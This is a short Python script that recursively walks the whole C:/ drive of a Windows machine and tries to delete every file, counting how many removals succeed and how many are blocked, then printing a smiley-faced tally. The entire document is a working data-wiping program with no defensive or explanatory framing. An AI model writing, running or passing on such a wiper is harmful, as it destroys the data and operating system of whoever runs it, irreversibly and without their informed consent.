import os

success=0
fail=0
for cur_dir, dirs, files in os.walk('C:/'):
    for file in files:
        try:
            f = os.path.abspath(f"{cur_dir}/{file}")
            os.remove(f)
            success+=1
        except:
            fail+=1
print(f"{success} files removed successfully :)")
print(f"{fail} files blocked by the OS! :(")
input("Press Any key to close the program.")